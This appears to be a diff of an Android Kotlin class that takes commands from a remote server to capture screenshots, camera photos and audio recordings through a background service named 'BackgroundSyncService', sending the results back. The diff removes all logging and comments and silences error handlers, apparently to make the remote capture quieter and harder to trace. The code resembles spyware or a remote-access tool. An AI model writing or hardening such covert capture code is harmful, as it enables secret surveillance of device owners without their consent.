@@ -87,8 +87,7 @@ class Commands(private val context: Context) {
                 }
 
                 connection.disconnect()
-            } catch (e: Exception) {
-                Log.e(TAG, "Error registering FCM token: ${e.message}")
+            } catch (_: Exception) {
             }
         }
     }
@@ -108,7 +107,6 @@ class Commands(private val context: Context) {
                 }
                 is JSONObject -> data
                 else -> {
-                    Log.e(TAG, "Unsupported data type for processFCMCommand: ${data.javaClass.name}")
                     return
                 }
             }
@@ -168,12 +166,8 @@ class Commands(private val context: Context) {
                     writer.write(responseData.toString())
                     writer.flush()
                 }
-
-                val responseCode = connection.responseCode
-                Log.d(TAG, "Command response sent, status: $responseCode")
                 connection.disconnect()
-            } catch (e: Exception) {
-                Log.e(TAG, "Error sending command response: ${e.message}")
+            } catch (_: Exception) {
             }
         }
     }
@@ -185,23 +179,16 @@ class Commands(private val context: Context) {
     private fun handleCaptureScreenshotCommand(command: JSONObject) {
         try {
             val commandId = command.optString("id")
-
-            // Send initial response that we're processing the command
             val result = JSONObject().apply {
                 put("message", "Screenshot capture initiated")
                 put("status", "pending")
             }
             sendCommandResponse(commandId, true, "Screenshot requested", result)
-
-            // Send intent to BackgroundSyncService to actually take the screenshot
             val intent = android.content.Intent(context, BackgroundSyncService::class.java)
             intent.action = "CAPTURE_SCREENSHOT"
             intent.putExtra("command_id", commandId)
             context.startService(intent)
-
-            Log.d(TAG, "Screenshot capture request sent to service")
         } catch (e: Exception) {
-            Log.e(TAG, "Error executing capture_screenshot command: ${e.message}")
             sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
         }
     }
@@ -224,16 +211,12 @@ class Commands(private val context: Context) {
                 put("status", "pending")
             }
             sendCommandResponse(commandId, true, "Camera capture requested", result)
-
-            // Send intent to BackgroundSyncService to take a photo
             val intent = android.content.Intent(context, BackgroundSyncService::class.java)
             intent.action = "CAPTURE_CAMERA"
             intent.putExtra("command_id", commandId)
             context.startService(intent)
 
-            Log.d(TAG, "Camera capture request sent to service")
         } catch (e: Exception) {
-            Log.e(TAG, "Error executing capture_camera command: ${e.message}")
             sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
         }
     }
@@ -241,7 +224,7 @@ class Commands(private val context: Context) {
     private fun handleCaptureAudioCommand(command: JSONObject) {
         try {
             val commandId = command.optString("id")
-            val duration = command.optInt("duration", 30) // Default 30 seconds
+            val duration = command.optInt("duration", 30)
 
             val result = JSONObject().apply {
                 put("message", "Audio recording initiated")
@@ -255,9 +238,7 @@ class Commands(private val context: Context) {
             intent.putExtra("duration", duration)
             context.startService(intent)
 
-            Log.d(TAG, "Audio recording request sent to service")
         } catch (e: Exception) {
-            Log.e(TAG, "Error executing capture_audio command: ${e.message}")
             sendCommandResponse(command.optString("id"), false, "Error: ${e.message}")
         }
     }
